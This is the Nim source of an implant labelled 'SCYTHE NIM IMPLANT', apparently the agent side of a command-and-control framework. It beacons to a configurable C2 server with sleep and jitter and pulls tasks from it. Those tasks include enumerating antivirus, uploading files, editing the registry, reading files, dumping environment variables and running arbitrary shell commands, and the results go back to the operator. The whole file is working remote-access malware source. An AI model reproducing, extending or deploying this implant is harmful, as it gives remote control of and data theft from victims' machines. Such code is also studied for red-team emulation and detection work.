import os, strutils, json, osproc
from util/webClient import Listener, newListener, getTasks, sendTaskResult, calculateSleep
from modules/whoami import whoami
from modules/getAV import getAv
from modules/upload import upload
from modules/copy import copyX
from modules/reg import reg

type
  Task = object
    id: string
    command: string
    args: seq[string]

proc parseTask(taskJson: JsonNode): Task =
  result.id = taskJson{"id"}.getStr("")
  result.command = taskJson{"command"}.getStr("")

  if taskJson.hasKey("args") and taskJson["args"].kind == JArray:
    for arg in taskJson["args"]:
      result.args.add(arg.getStr(""))

proc executeCommand(listener: Listener, task: Task): string =
  let cmd = task.command.toLowerAscii()

  case cmd:
    of "whoami":
      result = whoami()

    of "getav":
      result = getAv()

    of "upload":
      if task.args.len >= 2:
        result = upload(listener, task.args)
      else:
        result = "Invalid arguments for upload command"

    of "copy", "cp":
      result = copyX(task.args)

    of "reg", "registry":
      result = reg(task.args)

    of "pwd", "getcwd":
      result = getCurrentDir()

    of "cd":
      if task.args.len >= 1:
        try:
          setCurrentDir(task.args[0])
          result = "Changed directory to: " & getCurrentDir()
        except:
          result = "Failed to change directory: " & getCurrentExceptionMsg()
      else:
        result = "No directory specified"

    of "ls", "dir":
      let targetDir = if task.args.len > 0: task.args[0] else: getCurrentDir()
      try:
        result = ""
        for kind, path in walkDir(targetDir):
          case kind:
            of pcFile: result.add("[FILE] ")
            of pcDir: result.add("[DIR]  ")
            of pcLinkToFile: result.add("[LINK] ")
            of pcLinkToDir: result.add("[LNKD] ")
          result.add(extractFilename(path) & "\n")
      except:
        result = "Failed to list directory: " & getCurrentExceptionMsg()

    of "cat", "type":
      if task.args.len >= 1:
        try:
          result = readFile(task.args[0])
        except:
          result = "Failed to read file: " & getCurrentExceptionMsg()
      else:
        result = "No file specified"

    of "hostname":
      when defined(windows):
        result = getEnv("COMPUTERNAME", "unknown")
      else:
        result = getEnv("HOSTNAME", "unknown")

    of "env":
      for key, val in envPairs():
        result.add(key & "=" & val & "\n")

    of "ps", "processes":
      when defined(windows):
        result = "Process enumeration not implemented for Windows in this version"
      else:
        result = "Process enumeration not implemented for Unix in this version"

    of "sleep":
      if task.args.len >= 1:
        try:
          let sleepMs = parseInt(task.args[0]) * 1000
          result = "Sleep interval updated to " & $sleepMs & "ms"
        except:
          result = "Invalid sleep value"
      else:
        result = "No sleep value specified"

    of "jitter":
      if task.args.len >= 1:
        try:
          let jitterPercent = parseInt(task.args[0])
          result = "Jitter updated to " & $jitterPercent & "%"
        except:
          result = "Invalid jitter value"
      else:
        result = "No jitter value specified"

    of "sysinfo":
      result = "System Information:\n"
      result.add("OS: " & hostOS & "\n")
      result.add("CPU: " & hostCPU & "\n")
      result.add("Current User: " & whoami() & "\n")
      result.add("Current Directory: " & getCurrentDir() & "\n")
      when defined(windows):
        result.add("Computer: " & getEnv("COMPUTERNAME", "unknown") & "\n")
      else:
        result.add("Hostname: " & getEnv("HOSTNAME", "unknown") & "\n")

    of "exit", "quit":
      result = "Implant shutting down..."
      quit(0)

    else:
      # Try to execute as system command
      try:
        let cmdLine = task.command & " " & task.args.join(" ")
        let (output, exitCode) = execCmdEx(cmdLine)
        if exitCode == 0:
          result = output
        else:
          result = "Command failed with exit code " & $exitCode & ":\n" & output
      except:
        result = "Unknown command: " & task.command



proc printBanner() =
  echo """
┌─────────────────────────────────────────────────────────────────┐
│                      SCYTHE NIM IMPLANT                        │
│                   Advanced C2 Framework                        │
│                                                                 │
│  Features:                                                      │
│  • Cross-platform compatibility                                │
│  • HTTP/HTTPS C2 communication                                 │
│  • File upload/download capabilities                           │
│  • Registry manipulation (Windows)                             │
│  • System information gathering                                │
│  • Anti-detection techniques                                   │
└─────────────────────────────────────────────────────────────────┘
"""

proc main() =
  printBanner()

  # Parse command line arguments
  var
    host = "127.0.0.1"
    port = "8080"
    protocol = "http"
    userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    sleepTime = 5000  # 5 seconds
    jitterPercent = 20

  # Simple argument parsing
  let params = commandLineParams()
  var i = 0
  while i < params.len:
    case params[i].toLowerAscii():
      of "-h", "--host":
        if i + 1 < params.len:
          host = params[i + 1]
          i += 2
        else:
          echo "Error: --host requires a value"
          quit(1)

      of "-p", "--port":
        if i + 1 < params.len:
          port = params[i + 1]
          i += 2
        else:
          echo "Error: --port requires a value"
          quit(1)

      of "--https":
        protocol = "https"
        i += 1

      of "-s", "--sleep":
        if i + 1 < params.len:
          try:
            sleepTime = parseInt(params[i + 1]) * 1000
          except:
            echo "Error: Invalid sleep value"
            quit(1)
          i += 2
        else:
          echo "Error: --sleep requires a value"
          quit(1)

      of "-j", "--jitter":
        if i + 1 < params.len:
          try:
            jitterPercent = parseInt(params[i + 1])
          except:
            echo "Error: Invalid jitter value"
            quit(1)
          i += 2
        else:
          echo "Error: --jitter requires a value"
          quit(1)

      of "--help":
        echo "Usage: nimplant [options]"
        echo "Options:"
        echo "  -h, --host <host>     C2 server host (default: 127.0.0.1)"
        echo "  -p, --port <port>     C2 server port (default: 8080)"
        echo "  --https               Use HTTPS instead of HTTP"
        echo "  -s, --sleep <sec>     Sleep interval in seconds (default: 5)"
        echo "  -j, --jitter <pct>    Jitter percentage (default: 20)"
        echo "  --help                Show this help message"
        quit(0)

      else:
        echo "Unknown option: " & params[i]
        echo "Use --help for usage information"
        quit(1)

  # Initialize listener
  var listener = newListener(
    listenerType = protocol,
    host = "",
    ip = host,
    port = port,
    userAgent = userAgent
  )

  listener.sleepTime = sleepTime
  listener.jitter = jitterPercent

  echo "[+] Nimplant initialized"
  echo "[+] C2 Server: " & protocol & "://" & host & ":" & port
  echo "[+] Agent ID: " & listener.id
  echo "[+] Sleep: " & $(sleepTime div 1000) & "s (±" & $jitterPercent & "%)"
  echo "[+] Starting main loop..."
  echo ""

  # Main C2 loop
  var consecutiveErrors = 0
  const maxConsecutiveErrors = 5

  while true:
    try:
      # Get tasks from C2 server
      let tasksResponse = getTasks(listener)

      if tasksResponse.hasKey("error"):
        echo "[-] Error getting tasks: " & tasksResponse["error"].getStr()
        consecutiveErrors += 1

        if consecutiveErrors >= maxConsecutiveErrors:
          echo "[-] Too many consecutive errors, exiting..."
          break

      elif tasksResponse.hasKey("tasks"):
        consecutiveErrors = 0  # Reset error counter on successful communication
        let tasks = tasksResponse["tasks"]

        if tasks.kind == JArray and tasks.len > 0:
          echo "[+] Received " & $tasks.len & " task(s)"

          for taskJson in tasks:
            let task = parseTask(taskJson)
            echo "[*] Executing: " & task.command

            let output = executeCommand(listener, task)
            let success = sendTaskResult(listener, task.id, output)

            if success:
              echo "[+] Task result sent successfully"
            else:
              echo "[-] Failed to send task result"
        else:
          # No tasks available, just continue
          discard

      # Sleep with jitter
      let sleepMs = calculateSleep(listener)
      sleep(sleepMs)

    except:
      echo "[-] Unexpected error: " & getCurrentExceptionMsg()
      consecutiveErrors += 1

      if consecutiveErrors >= maxConsecutiveErrors:
        echo "[-] Too many errors, shutting down..."
        break

      # Sleep before retrying
      sleep(5000)

# Entry point
when isMainModule:
  main()
